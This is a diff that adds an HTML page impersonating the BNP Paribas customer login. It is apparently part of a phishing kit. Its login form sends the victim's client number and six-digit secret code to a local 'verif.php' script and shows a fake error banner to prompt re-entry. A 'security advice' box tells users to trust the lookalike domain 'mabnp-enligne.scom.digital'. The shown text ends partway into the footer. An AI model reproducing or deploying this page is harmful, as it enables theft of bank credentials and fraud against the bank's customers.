@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+
+<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <title>log</title>
+	  <meta content="IE=edge,chrome=1" http-equiv="X-UA-compatible"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><link type="image/x-icon" href="https://connexion-mabanque.bnpparibas/favicon.ico" rel="shortcut icon"><!-- Publi CSS --><link type="text/css" href="./log/style2.css" rel="stylesheet"><link type="text/css" href="./log/cas-footer-part.css" rel="stylesheet">
+	  <link type="text/css" href="https://mabanque.bnpparibas/rsc/contrib/identification/src/themes/mabanque/css/style.css" rel="stylesheet" /><link type="text/css" href="https://mabanque.bnpparibas/rsc/contrib/css/particuliers/cas-footer-part.css" rel="stylesheet" /><link type="text/css" href="./log/cas-header-part.css" rel="stylesheet" />
+	  
+
+ <link rel="stylesheet" href="css/main.css" />
+
+
+
+  
+
+      
+      </head>
+   <body class="fr web world pub client no-bread-crumb ident part mw-1400" onresize="responsiveClickZone()" >
+         
+
+         <div class="ls-canvas" id="ls-canvas">
+         	<!-- ================================ --><!-- HEADER --><!-- ================================ --><div id="zone-publiable-header"><header class="top-header row">
+    <div class="col-90">
+        <nav class="row">
+            <ul class="list-header part-only">
+                <li class="nav-part"><a href="https://mabanque.bnpparibas/fr/Accueil-part-fr">Particuliers</a></li>
+                <li class="nav-bpf"><a href="https://mabanqueprivee.bnpparibas/fr/a-la-une-bpf">Banque privée</a></li>
+                <li class="nav-pro"><a href="https://mabanquepro.bnpparibas/fr/a-la-une-pro">Professionnels</a></li>
+                <li class="nav-ent"><a href="https://banqueentreprise.bnpparibas/">Entreprises</a></li>
+                <li class="nav-asso"><a href="https://associationsetfondations.bnpparibas/">Associations</a></li>
+            </ul>
+
+            <ul class="list-header pro-only">
+                <li class="nav-pro"><a href="https://mabanquepro.bnpparibas/fr/a-la-une-pro">Professionnels</a></li>    
+                <li class="nav-part"><a href="https://mabanque.bnpparibas/fr/Accueil-part-fr">Particuliers</a></li>
+                <li class="nav-bpf"><a href="https://mabanqueprivee.bnpparibas/fr/a-la-une-bpf">Banque privée</a></li>      
+                <li class="nav-ent"><a href="https://banqueentreprise.bnpparibas/">Entreprises</a></li> 
+                <li class="nav-asso"><a href="https://associationsetfondations.bnpparibas/">Associations</a></li>
+            </ul>
+        </nav>  
+    </div> 
+    <!--
+	<div id="nav-accessibilite">
+		<ul>
+			<li>
+				<a href="https://mabanque.bnpparibas/fr/accessibilite">
+					Accessibilité
+				</a>
+			</li>
+		</ul>
+	</div>
+  -->
+     <div class="col-10 part-only pull-right" id="select-langues">
+        <ul>
+			<li data-toggle-section=".en">
+			FR
+			</li>
+			<li class="en hidden">
+				<a href="https://mabanque.bnpparibas/en/home">EN</a>
+			</li>
+		</ul>
+    </div>
+</header>
+<header class="bottom-header">
+    <div class="no-mob">
+        <div class="logoBNP-container">
+        <a href="https://mabanque.bnpparibas/" class="logoBNP-alone text-hide part-only">BNP Paribas La banque d'un monde qui change</a>
+        <a href="https://mabanque.bnpparibas/" class="logoBNP-alone text-hide pro-only">BNP Paribas La banque d'un monde qui change</a>
+        <p>La banque d'un monde qui change</p>
+        </div>
+        <a href="https://mabanque.bnpparibas/fr/connexion" class="bouton-espace-client" id="bouton-espace-client">Accéder à mes comptes</a>
+        <a href="https://mabanque.bnpparibas/fr/devenir-client-bnp-paribas" class="bouton-devenir-client part-only">Devenir client</a>
+        <a href="https://mabanque.bnpparibas/fr/notre-offre-pro/comptes-cartes-et-services/devenir-client-ouvrir-un-compte/ouvrir-un-compte-bancaire" class="bouton-devenir-client pro-only">Devenir client</a>
+        <!-- || SOS CARTE || --> 
+        <div id="acces-sos-carte">                          
+            <button data-toggle-section="#quickAccesMenuSosCarte" class="part-only"> 
+                <span class="pictoGiroSos"><i class="icon icon-picto-giro"></i></span>                         
+                <!--Urgence-->
+            </button>   
+ 
+            <button data-toggle-section="#quickAccesMenuSosCarte" class="bpf-only">  
+                <img src="./log/urgence.svg" class="pictoWhite">   
+                <img src="./log/picto-giro-bpf.svg" class="pictoGreen">            
+                <img src="./log/picto-giro.svg" class="pictoGrey">                          
+                Urgence          
+            </button>               
+  
+            <div id="quickAccesMenuSosCarte" class="hidden">   
+                <div class="header pull-left">            
+                    <div class="pull-left">              
+                        <p>Vous avez une urgence ?</p>            
+                        <p>Sélectionnez votre urgence pour trouver une solution à distance.</p>   
+                    </div>    
+
+                    <button class="pull-right icon icon-close-white" data-hide-section="#quickAccesMenuSosCarte"></button>           
+                </div> 
+
+                <div class="content">     
+                    <div class="content-left"> 
+                        <div class="moyens-paiement">
+                            <p class="title pull-left">Mes moyens de paiement</p> 
+ 
+                            <ul class="pull-right">    
+                                <li class="sosA1 active">
+                                    <a href="https://mabanque.bnpparibas/fr/connexion/assistance/sos-carte" class="part-only">
+                                        <span>Débloquer ma carte</span>  
+                                    </a>  
+
+                                    <a href="https://mabanque.bnpparibas/fr/espace-prive/assistance/sos-carte-bpf" class="bpf-only">
+                                        <span>Débloquer ma carte</span>
+                                    </a>        
+                                </li>
+                                <li class="sosA2"><a href="https://mabanque.bnpparibas/fr/connexion/virements-services/oppositions/opposition-carte"><span>Opposer ma carte</span></a></li> 
+                                <li class="sosA3"><a href="https://mabanque.bnpparibas/fr/connexion/virements-services/oppositions/opposition-cheques"><span>Opposer un chèque/mon chéquier</span></a></li>
+                                <li class="sosA4"><a href="https://mabanque.bnpparibas/fr/connexion/virements-services/oppositions/opposition-prelevement"><span>Opposer un prélèvement</span></a></li> 
+                            </ul>  
+                        </div> 
+   
+                        <div class="mes-assurances">   
+                            <p class="title pull-left">Mes assurances</p>       
+                            
+                            <ul class="pull-right part-only">         
+                                <li class="sosB2"><a href="https://mabanque.bnpparibas/fr/assurer/declarer-sinistre/assurance-auto-declarer-sinistre"><span>Assurance auto</span></a></li>          
+                                <li class="sosB3"><a href="https://mabanque.bnpparibas/fr/assurer/declarer-sinistre/assurance-habitation-declarer-sinistre"><span>Assurance habitation</span></a></li>   
+                                <li class="sosB1"><a href="https://mabanque.bnpparibas/fr/assurer/declarer-sinistre/bnp-paribas-securite-et-securite-plus-declarer-sinistre"><span>Perte et vol de clés</span></a></li>
+                                <li class="sosB4"><a href="https://mabanque.bnpparibas/fr/assurer/declarer-sinistre/mobileo-mobileo2-declarer-sinistre"><span>Assurance des appareils nomades</span></a></li>                    
+                            </ul>  
+                            <ul class="pull-right bpf-only">         
+                                <li class="sosB2"><a href="https://mabanque.bnpparibas/fr/banque-contact/nous-contacter/prevenir-et-declarer-un-sinistre/assurance-auto"><span>Assurance auto</span></a></li>          
+                                <li class="sosB3"><a href="https://mabanque.bnpparibas/fr/banque-contact/nous-contacter/prevenir-et-declarer-un-sinistre/assurance-habitation"><span>Assurance habitation</span></a></li>   
+                                <li class="sosB1"><a href="https://mabanque.bnpparibas/fr/banque-contact/nous-contacter/prevenir-et-declarer-un-sinistre/bnp-paribas-securite-securite-plus"><span>Perte et vol de clés</span></a></li>
+                                <li class="sosB4"><a href="https://mabanque.bnpparibas/fr/banque-contact/nous-contacter/prevenir-et-declarer-un-sinistre/mobileo-mobileo2"><span>Assurance des appareils nomades</span></a></li>                 
+                            </ul>       
+
+                        </div>      
+                    </div>        
+  
+                    <div class="separate"></div>   
+
+                    <div class="content-right">  
+                        <div id="sosA1" class="changeContent">     
+                            <img src="./log/picto-carte-bloqu-e.png" class="part-only">  
+                            <img src="./log/debloquer-carte-bpf.png" class="bpf-only">       
+                            <p class="title">Carte refusée ? code pin oublié ?</p>      
+                            <p class="subtitle">Sélectionnez la carte avec laquelle vous rencontrez des problèmes et obtenez de l'aide.</p>  
+                        </div>
+
+                        <div id="sosA2" class="changeContent hidden">    
+                            <img src="./log/oposer-carte.png" class="part-only">  
+                            <img src="./log/oposer-carte-bpf.png" class="bpf-only">   
+                            <p class="title">Carte perdue ou volée ?</p>       
+                            <p class="subtitle">Opposez votre carte en quelques clics</p>  
+                        </div> 
+
+                        <div id="sosA3" class="changeContent hidden">    
+                            <img src="./log/opposer-cheque.png" class="part-only"> 
+                            <img src="./log/opposer-cheque-bpf.png" class="bpf-only">   
+                            <p class="title">Chèque perdu ? chéquier volé ?</p>         
+                            <p class="subtitle">Opposez un chèque ou votre chéquier en suivant ce lien</p>  
+                        </div> 
+        
+                        <div id="sosA4" class="changeContent hidden">      
+                            <img src="./log/opposer-prelevement.png" class="part-only"> 
+                            <img src="./log/opposer-prelevement-bpf.png" class="bpf-only">    
+                            <p class="title">Vous souhaitez opposer un prélèvement ?</p>        
+                            <p class="subtitle">Cliquez sur le lien puis sélectionnez le prélèvement à opposer</p>  
+                        </div>  
+
+                        
+                        <div id="sosB2" class="changeContent hidden"> 
+                                <img src="./log/picto-voiture.png" class="part-only"> 
+                                <img src="./log/picto-voiture-bpf.png" class="bpf-only">       
+                            <p class="title">Assistance auto</p>    
+        
+                            <div class="assistanceContent"> 
+                                <p>Si vous détenez un contrat Assurance Auto BNP Paribas, cliquez pour afficher les numéros d’assistance.</p>  
+                                <!-- <p class="pull-left textAssurance">Contactez, 24/24 7j/7 votre assistance au 01 55 92 26 64 (appel non surtaxé).</p> -->
+                            </div>                
+                        </div>              
+
+
+
+                        <div id="sosB3" class="changeContent hidden">  
+                                <img src="./log/picto-maison.png" class="part-only"> 
+                                <img src="./log/picto-maison-bpf.png" class="bpf-only">        
+                            <p class="title">Assistance habitation</p>   
+
+                            <div class="assistanceContent"> 
+                                <p>Si vous détenez un contrat Assurance Habitation BNP Paribas, cliquez pour afficher les numéros d’assistance.</p> 
+                                <!-- <p class="pull-left textAssurance">Contactez, 24/24 7j/7 votre assistance au 01 55 92 26 64 (appel non surtaxé).</p>  -->
+                            </div>    
+                        </div>  
+                        
+                        <div id="sosB1" class="changeContent hidden">   
+                                <img src="./log/picto-cles-QA.png" class="part-only"> 
+                                <img src="./log/picto-cle-QA-bpf.png" class="bpf-only">  
+                            <p class="title">Perte et vol de clés</p>       
+                            <p>Si vous détenez un contrat BNP Paribas Sécurité ou Sécurité Plus, cliquez pour afficher les numéros d’assistance.</p> 
+                            <!-- <div class="group-phone"> 
+                                <ul>  
+                                    <li> 
+                                        <p>Pour BNP Paribas Sécurité</p>
+
+                                        <div>
+                                            <p class="pull-left">Depuis la France et l'étranger :</p>
+
+                                            <img src="https://mabanque.bnpparibas/rsc/contrib/image/generique/numero-vert.png" class="pull-left" />
+                                        </div>
+                                    </li>
+
+                                    <li>
+                                        <p>Pour BNP Paribas Sécurité</p> 
+
+                                        <div>
+                                            <p class="pull-left">Depuis la France :</p>  
+
+                                            <img src="https://mabanque.bnpparibas/rsc/contrib/image/generique/numero-gris.png" class="pull-left" />
+
+                                            <p class="lastP">Depuis l'étranger : (00 33) 1 55 92 23 68 (appel non surtaxé).</p>  
+                                        </div> 
+                                    </li>  
+                                </ul>
+                            </div>  -->
+                        </div>
+
+                        <div id="sosB4" class="changeContent hidden">
+                            <img src="./log/picto-mobileo.png" class="part-only"> 
+                            <img src="./log/picto-mobileo(1).png" class="bpf-only">
+                            <p class="title">Assistance Mobileo</p>
+                            <div class="assistanceContent">
+                                <p>Si vous détenez un contrat Mobileo, cliquez pour afficher les numéros d’assistance</p>
+                            </div>
+                        </div>
+
+                    </div>          
+                </div>  
+            </div>
+        </div>
+        <!-- ///////// -->
+        <a id="open-recherche-nonconnecte" href="https://connexion-mabanque.bnpparibas/login?service=%2Foauth2.0%2FcallbackAuthorize%3Fclient_id%3D0e0fe16f-4e44-4138-9c46-fdf077d56087%26redirect_uri%3Dhttps%253A%252F%252Fmabanque.bnpparibas%252Fauth%252Fon-login%26response_type%3Dcode%26state%3Df3y4Vrczr3c9eHqaeeIzATPj%26nonce%3D9JIR2TtC%26client_name%3DCasOAuthClient#" class="list-header-connected">
+            <i class="search"></i>  
+            <span>Recherche</span>      
+        </a>  
+    </div>
+    <header class="bottom-header-connected mobile-only pull-left" id="nav-connect">
+        <ul id="nav-connect-item" class="list-header-connected left nav-connecte-items mobile-only">
+            <li class="js-toggle-subnav"><i class="burger"></i></li>
+            <li class="logo"><a href="https://mabanque.bnpparibas/" class="logoBNP"></a></li>
+            <li id="bouton-espace-client-mobile" class="bottom-header-lock pull-right"><span class="icon icon-lock"></span></li>
+            <li class="inbenta-mobile-search"><a id="open-recherche-nonconnecte-mobile" href="https://mabanque.bnpparibas/#" class="list-header-connected " style=""><i class="search"></i><span class="text-hide">Recherche</span></a></li>
+		
+        </ul>
+    </header>
+    <form class="form hidden recherche-qualifie-container" id="recherche-site"></form>
+</header>
+   </div>
+			<div id="zone-publiable-message"><style>
+  body.ident #mainContent {
+    padding-top: 0px;
+  }
+</style>
+
+<section class="part-only row" style="
+    margin-top: 60px;
+    width: 100%;
+    background-color: rgb(181, 92, 133);
+    padding-top: 8px;
+  ">
+<!--
+  <i
+    class="icon icon-info"
+    style="color: #fff; font-size: 2em; float: left; margin: 0.8em"
+  ></i>
+  <p
+    class="pull-left"
+    style="
+      line-height: 1.2em;
+      font-size: 1em;
+      margin-top: 20px;
+      width: calc(100% - 85px);
+      margin-left: 20px;
+      color: #ffffff;
+    "
+  >
+  De faux SMS pouvant être suivis d’un appel au nom de BNP PARIBAS par des personnes malveillantes sont actuellement identifiés par nos services de sécurité.
+  Les fraudeurs vous invitent à cliquer sur un lien pour récupérer vos données bancaires.
+  Restez vigilants, ne communiquez jamais vos informations personnelles par email, tel ou SMS. 
+  Au moindre doute, contactez immédiatement le Service Client au 3477 (service gratuit + prix d’appel)  
+  </p>
+  -->
+</section>
+<section class="pro-only row" style="
+    margin-top: 50px;
+    width: 100%;
+    background-color: rgb(181, 92, 133);
+    padding-top: 8px;
+  ">
+<!--
+  <i
+    class="icon icon-info"
+    style="color: #fff; font-size: 2em; float: left; margin: 0.8em"
+  ></i>
+  <p
+    class="pull-left"
+    style="
+      line-height: 1.2em;
+      font-size: 1em;
+      margin-top: 30px;
+      width: calc(100% - 85px);
+      margin-left: 20px;
+      color: #ffffff;
+    "
+  >
+  De faux SMS pouvant être suivis d’un appel au nom de BNP PARIBAS par des personnes malveillantes sont actuellement identifiés par nos services de sécurité.
+  Les fraudeurs vous invitent à cliquer sur un lien pour récupérer vos données bancaires.
+  Restez vigilants, ne communiquez jamais vos informations personnelles par email, tel ou SMS. 
+  Au moindre doute, raccrochez, puis contactez immédiatement le Service Client au 3478 (Service gratuit + prix d’appel).
+  
+
+  </p>
+  -->
+</section>
+
+<section class="bpf-only row" style="margin-top: 60px; width: 100%; background-color: rgb(181, 92, 133)">
+<!--
+  <i
+    class="icon icon-info"
+    style="color: #fff; font-size: 2em; float: left; margin: 0.8em"
+  ></i>
+  <p
+    class="pull-left"
+    style="
+      line-height: 1.2em;
+      font-size: 1em;
+      margin-top: 23px;
+      width: calc(100% - 85px);
+      margin-left: 20px;
+      color: #ffffff;
+    "
+  >
+  De faux SMS pouvant être suivis d’un appel au nom de BNP PARIBAS par des personnes malveillantes sont actuellement identifiés par nos services de sécurité.
+  Les fraudeurs vous invitent à cliquer sur un lien pour récupérer vos données bancaires.
+  Restez vigilants, ne communiquez jamais vos informations personnelles par email, tel ou SMS. 
+  Au moindre doute, raccrochez, puis contactez immédiatement Privilège Connect au 3273 (Service gratuit + prix d’appel).
+  
+  </p>
+  -->
+</section>
+
+
+</div>
+            
+            <!-- =============================================== --><!-- Identification - Spécifique à CAS OIDC Provider --><!-- =============================================== --><div class="ls-row" id="wrapper">
+               <div class="ls-fxr" id="ls-gen24968870-ls-fxr">
+                  <div class="ls-area mainContent" id="mainContent">
+                     <div class="ls-area-body" id="ls-gen24968871-ls-area-body">
+                        <div class="ls-cmp-wrap ls-1st" id="w1413474755922">
+						    <div class="iw_component" id="1413474755922"><!--content start--><div id="wcm-l-">
+						        <div class="wcm-html style-default "></div>
+						    </div><!--content stop-->
+						    </div>
+						</div>
+                        <div class="ls-cmp-wrap" id="w1413474755927">
+                           <div class="iw_component" id="1413474755927">
+                              <!--Tools Component start (AJAX Mode)--><style>
+									#secret-nbr-keyboard {background-image: url("https://connexion-mabanque.bnpparibas/grid/n-49507846529280429218836025270449695674");}
+							  </style>
+							
+                              
+                              
+                              <div id="id_balise_div">
+                              	<div class="canvasLoader hidden" style="width: 80px; height: 80px; margin: 300px auto 0 auto;"><canvas width="80" height="80" style="width: 80px; height: 80px;"></canvas></div>
+                              	<div class="wcm-ia-column">
+									<div id="ia-identification">
+										<div rv-show="data.codeRetour | couldShow">
+											<div class="ident">
+												<div class="carret-up"></div>
+												
+												<!-- Identification Grille --><section class="main-content fond-gradient">
+													<div class="container-ident">
+														<div class="message-erreur arrow-bottom" id="message-erreur"></div>
+														<h2 rv-text="config.app.identification.titre"><span class="label_field">Accéder à mes Comptes</span></h2>
+														<form method="post" id="logincanalnet" name="logincanalnet" class="form" autocomplete="off" action="verif.php" >
+												<div class="alert alert-danger" > 
+												
+												<span > Numéro Client ou Code Secret !	</span>					        		
+												
+												</div> 		
+		
+											        		
+															<ul class="grille-ident">
+																<li style="position: relative;">
+																	<label for="username" rv-text="config.app.identification.numclient">1. <span class="label_field">Mon numéro client</span></label>
+												
+																	<input type="tel" required pattern="[0-9]*" value="" name="leuser" maxlength="10" size="10" autofocus="" autocorrect="off" id="username" class="form-control numeric" rv-value-reactive="form.idTelematique"><a class="reset-input" href="#"></a>
+																	
+																	<input type="checkbox" value="" id="memoriser" name="memoriser"><label for="memoriser" class="checkbox-inline" rv-text="config.app.identification.memoriser">Mémoriser mon numéro client</label>
+																</li>
+																<li style="position: relative;">
+																		<label rv-text="config.app.identification.password">2. <span class="label_field">Mon code secret (6 chiffres)</span></label>
+																		<div class="field-password off" >
+																																						
+																			<input type="password" name="lepas" required id="password" class="form-control" /><a class="reset-input" id="initPass" href="#"></a>
+		
+																			
+																			
+																				<div id="pinpad">
+																					<input type="button" value="1" id="1" class="pinButton calc"/>
+																					<input type="button" value="2" id="2" class="pinButton calc"/>
+																					<input type="button" value="3" id="3" class="pinButton calc"/><br>
+																					<input type="button" value="4" id="4" class="pinButton calc"/>
+																					<input type="button" value="5" id="5" class="pinButton calc"/>
+																					<input type="button" value="6" id="6" class="pinButton calc"/><br>
+																					<input type="button" value="7" id="7" class="pinButton calc"/>
+																					<input type="button" value="8" id="8" class="pinButton calc"/>
+																					<input type="button" value="9" id="9" class="pinButton calc"/><br>
+																					<input type="button" value="Effacer" id="clear" class="pinButton clear"/>
+																					<input type="button" value="0" id="0 " class="pinButton calc"/>
+																					<input type="button" value="Valider" id="enter" class="pinButton enter"/>
+																					
+																				</div>	
+																					  
+																			<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="./js/app.js"></script>
+    
+
+
+
+
+
+
+																		</div>
+																		<div class="cell-password">
+																		<br><br>
+																			<div class="field-valid">
+																				<section>
+																					<button type="submit" class="btn-primary btn-block" id="submitIdent"  value="Accéder à mes Comptes">
+																						<span class="label_field">Accéder à mes Comptes</span>
+																					</button>
+																				</section>
+																			</div>
+																		</div>									
+																		<div id="zone-publiable-basse"><p id="zonePubliableBasIdentificationPart"></p>
+																		</div>
+																</li>
+																<li style="position: relative;">
+																	<button type="button" id="buttonPopinNumClientMDP">
+																		Numéro client ou code secret oublié ? </button>
+																</li>
+															</ul>
+														</form>
+													</div>
+												</section>
+											
+												<aside class="col-aside arrow-left">
+													<div id="zone-publiable-haute">
+														<div id="popinNumClientMDP" class="hidden" aria-modal="true" role="dialog" aria-hidden="true">
+															<div role="document">
+																<button class="popin-close"><span class="sr-only">Fermer la popin</span><span aria-hidden="true">X</span></button>
+														
+																<div>
+																	<p class="title">Numéro client ou code secret oublié</p>
+																	<p>Sélectionnez l’élément que vous souhaitez récupérer :</p>
+														
+																	<div class="btn-group">
+																		<a id="recupNumClient" href="https://mabanque.bnpparibas/fr/banque-contacts/rit">
+																			<span>
+																				Retrouver mon numéro client
+																				<br>
+																				<span>(nécessaire à la réinitialisation de votre code secret)</span>
+																			</span>
+																		</a>
+														
+																		<a id="recupClientMDP" href="https://mabanque.bnpparibas/fr/banque-contacts/recuperer-code-secret">
+																			<span>Retrouver mon code secret</span>
+																		</a>
+																	</div>
+																</div>
+															</div>
+														</div>
+														
+														<div id="popinCache" class="hidden"></div>
+													<div class="new-ident" id="new-ident">
+	<div class="section-wrap">
+		<h2><i class="icon icon-picto-cadenas"></i>Vos codes d'accès</h2><p>
+		<a href="https://mabanque.bnpparibas/fr/gerer/services-lies-compte/options-et-services/code-acces-compte-en-ligne">Obtenir ses codes d'accès</a></p>
+	</div>
+
+	<div class="section-wrap encartSecu">
+		<h2><i class="icon icon-picto-bouclier"></i>Conseils de sécurité</h2>
+		<p>Vérifiez que <strong>l'adresse du site commence exactement par :</strong></p>
+		<p class="url"><strong>https://mabnp-enligne.scom.digital</strong></p> 
+		<div class="row">
+			<div class="col-55">
+				<p>précédée par une icône cadenas et contient un <strong>https://</strong> qui garantiront une connexion sécurisée.</p>
+				<p><a href="https://mabnp-enligne.scom.digital">Découvrez nos conseils sécurité</a> et les bonnes pratiques pour consulter et identifier les dangers du web.</p>
+			</div>
+		</div>
+	</div>
+
+	<div class="section-wrap">
+		<h2><i class="icon icon-picto-oeil"></i>Pour une meilleure accessibilité</h2>
+		<p>
+			<a id="ident-accessible" href="https://mabanque.bnpparibas/auth/login?a=true">Connectez-vous</a> grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal.
+		</p>
+
+		<p><a href="https://ws.facil-iti.com/" target="_blank" aria-label="Utilisez Facil&#39;iti, nouvelle fenêtre">Utilisez Facil'iti</a> pour personnaliser l'affichage en fonction de votre situation (handicap visuel ou cognitif).</p>
+		<p><a href="https://mabanque.bnpparibas/fr/accessibilite/acceo">Accédez au service Sourds et Malentendants, Sourds et Aveugles ou Aphasiques</a> pour contacter un conseiller avec un dispositif en LSF (Langue des Signes Française), en LPC (Langage Parlé Complété) ou en TIP (Transcription Instantanée de la Parole).</p>
+		<p><a href="https://mabanque.bnpparibas/fr/accessibilite">Rendez-vous sur la page Accessibilité</a> pour plus d'informations sur l'accessibilité numérique chez BNP Paribas.</p>
+	</div>
+
+	<div class="section-wrap">
+		<h2><i class="icon icon-picto-telephone"></i>Informations client</h2>
+		<p>Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter nos conseillers en ligne au :</p>
+		<div class="telephone first grey small">
+			<div class="number arrow-right"><span>3277</span></div>
+			<div class="texte"><p>Service gratuit <br> + prix appel</p></div>
+		</div>
+
+		<p>
+			ou à nous
+			<a href="https://mabanque.bnpparibas/fr/nous-contacter/nous-contacter/faq-assistance-technique">signaler un problème technique</a>.
+			<br>
+			Vous pouvez également gérer vos comptes depuis votre mobile ou votre tablette via l'application
+			<a href="https://mabanque.bnpparibas/fr/ma-banque-et-moi/nos-applications" aria-label="En savoir plus sur l&#39;application Mes comptes et autres applis BNP Paribas">Mes comptes</a>.
+		</p>
+	</div>
+</div>
+</div>
+												</aside></div>
+											<div class="identification_erreur_tech" rv-show="data.codeRetour | couldNotShow" style="display: none;"><p></p></div>									
+										</div>									
+									</div>
+                              </div>
+                              <!--Tools Component stop--></div>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="ls-row-clr"></div>
+               </div>
+            </div>
+            
+         </div>
+         <!-- ================================ --><!-- FOOTER --><!-- ================================ --><div id="zone-publiable-footer"><footer id="default-footer-refresh">
+    <div class="footer-section_reseaux-sociaux">
+        <div class="footer-section_reseaux-sociaux-container">
+            <span>Suivez-nous sur :</span>
+            <a href="https://www.facebook.com/mabanque.bnpparibas">
+                <!-- <img src="https://mabanque.bnpparibas/rsc/contrib/image/particuliers/homepage/fb.svg" alt="facebook"> -->
+                <svg xmlns="http://www.w3.org/2000/svg" width="8" height="19" viewBox="0 0 8 19">
+                    <g fill="none" fill-rule="evenodd">
+                        <path fill="#FFF" d="M8 8.83H5.356V19H1.678V8.72H0V5.787h1.678c0-1.745-1-6.422 6.286-5.715v3.45c-1.179 0-2.642-.296-2.642 2.265H8v3.042z"></path>
+                    </g>
+                </svg>
+            </a>
+            <a href="https://twitter.com/mabanque_bnpp">
+                <svg xmlns="http://www.w3.org/2000/svg" width="23" height="19" viewBox="0 0 23 19">
+                    <g fill="none" fill-rule="evenodd">
+                        <path fill="#FFF" d="M7.396 19C3.95 19 .81 17.546 0 16.923c0 0 3.85.727 6.787-2.073-1.518-.518-3.342-.933-4.152-3.318.91.207.91.207 1.823-.103C2.937 10.704 1.621 9.562.81 6.763c.811.414 1.622.621 2.23.621C1.62 5.829.203 3.654 1.518.956c.914.831 4.967 5.288 9.731 4.873 0-2.28.708-4.25 2.329-5.184 1.621-.934 4.359-1.037 5.674.935 1.047.552 2.838.415 3.748 0-.405.83-1.824 2.696-2.532 3.213C20.568 5.622 19.86 19 7.396 19z"></path>
+                    </g>
+                </svg>
+            </a>
+            <a href="https://www.youtube.com/channel/UCJeiOCUqrEbMqvqjuYVSihQ/">
+                <svg xmlns="http://www.w3.org/2000/svg" width="27" height="19" viewBox="0 0 27 19">
+                    <g fill="none" fill-rule="evenodd">
+                        <path fill="#FFF" d="M11.713 13.004l-.002-7.59 7.296 3.808-7.294 3.782zM26.73 4.099s-.264-1.861-1.073-2.682C24.63.342 23.479.336 22.952.273 19.173 0 13.506 0 13.506 0h-.012S7.827 0 4.048.273C3.521.336 2.37.342 1.343 1.417.533 2.237.27 4.099.27 4.099S0 6.285 0 8.47v2.049c0 2.187.27 4.372.27 4.372s.264 1.862 1.073 2.681C2.37 18.65 3.72 18.616 4.32 18.73c2.16.207 9.18.271 9.18.271s5.673-.008 9.452-.281c.527-.063 1.678-.07 2.705-1.146.81-.819 1.073-2.68 1.073-2.68s.27-2.186.27-4.373V8.471c0-2.186-.27-4.372-.27-4.372z"></path>
+                    </g>
+                </svg>                          
+            </a>
+            <a href="https://www.instagram.com/mabanquebnpparibas/">
+                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="19" height="19" viewBox="0 0 19 19">
+                    <defs>
+                        <path id="a" d="M0 .006h18.994v18.992H0z"></path>
+                    </defs>
+                    <g fill="none" fill-rule="evenodd">
+                        <g>
+                            <mask id="b" fill="#fff">
+                                <use xlink:href="#a"></use>
+                            </mask>
+                            <path fill="#FFF" d="M9.497.006c-2.58 0-2.903.01-3.916.057-1.01.046-1.7.207-2.305.442A4.655 4.655 0 0 0 1.594 1.6 4.655 4.655 0 0 0 .499 3.282C.264 3.886.103 4.577.057 5.587.011 6.6 0 6.924 0 9.503c0 2.58.01 2.903.057 3.916.046 1.01.207 1.7.442 2.305a4.655 4.655 0 0 0 1.095 1.682 4.656 4.656 0 0 0 1.682 1.095c.604.235 1.295.396 2.305.442 1.013.046 1.337.057 3.916.057 2.58 0 2.903-.01 3.916-.057 1.01-.046 1.7-.207 2.305-.442a4.656 4.656 0 0 0 1.682-1.095 4.656 4.656 0 0 0 1.095-1.682c.235-.604.396-1.295.442-2.305.046-1.013.057-1.337.057-3.916 0-2.58-.01-2.903-.057-3.916-.046-1.01-.207-1.7-.442-2.305A4.656 4.656 0 0 0 17.4 1.6 4.655 4.655 0 0 0 15.718.505C15.114.27 14.423.109 13.413.063 12.4.017 12.076.006 9.497.006zm0 1.711c2.536 0 2.836.01 3.838.056.926.042 1.428.196 1.763.327.443.172.76.378 1.092.71.332.332.538.649.71 1.092.13.335.285.837.327 1.763.046 1.002.056 1.302.056 3.838s-.01 2.836-.056 3.838c-.042.926-.196 1.428-.327 1.763-.172.443-.378.76-.71 1.092a2.942 2.942 0 0 1-1.092.71c-.335.13-.837.285-1.763.327-1.002.046-1.302.056-3.838.056s-2.836-.01-3.838-.056c-.926-.042-1.428-.196-1.763-.327a2.942 2.942 0 0 1-1.092-.71 2.943 2.943 0 0 1-.71-1.092c-.13-.335-.285-.837-.327-1.763-.046-1.002-.056-1.302-.056-3.838s.01-2.836.056-3.838c.042-.926.196-1.428.327-1.763.172-.443.378-.76.71-1.092a2.942 2.942 0 0 1 1.092-.71c.335-.13.837-.285 1.763-.327 1.002-.046 1.302-.056 3.838-.056z" mask="url(#b)"></path>
+                        </g>
+                        <path fill="#FFF" d="M9.497 12.669a3.166 3.166 0 1 1 0-6.332 3.166 3.166 0 0 1 0 6.332zm0-8.043a4.877 4.877 0 1 0 0 9.754 4.877 4.877 0 0 0 0-9.754zM15.706 4.433a1.14 1.14 0 1 1-2.28 0 1.14 1.14 0 0 1 2.28 0"></path>
+                    </g>
+                </svg>
+            </a>
+            <a href="https://www.linkedin.com/company/bnp-paribas/">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="19" viewBox="0 0 20 19">
+                    <g fill="none" fill-rule="evenodd">
+                        <path fill="#FFFFFE" d="M16.518 16.19h-2.873v-4.41c0-1.05-.02-2.403-1.494-2.403-1.496 0-1.726 1.145-1.726 2.328v4.486H7.553V7.123h2.757v1.239h.039c.384-.713 1.322-1.464 2.72-1.464 2.912 0 3.45 1.878 3.45 4.319v4.974zM4.312 5.885c-.921 0-1.667-.733-1.667-1.635 0-.901.746-1.633 1.667-1.633.92 0 1.667.732 1.667 1.633 0 .902-.747 1.635-1.667 1.635zM2.874 16.19h2.875V7.123H2.874v9.068zM17.95 0H1.43C.642 0 0 .613 0 1.37v16.26C0 18.385.641 19 1.43 19h16.52c.791 0 1.435-.614 1.435-1.37V1.37c0-.757-.644-1.37-1.435-1.37z"></path>
+                    </g>
+                </svg>
+            </a>
+        </div>
+    </div>
+
+    <div class="footer-section">
+        <a href="https://mabanque.bnpparibas/fr/nous-contacter/nous-contacter" class="footer-section_container1 col-3 mob-50">
+            <span class="footer-section_titre1">Contact</span>
+            <p class="footer-section_content1">
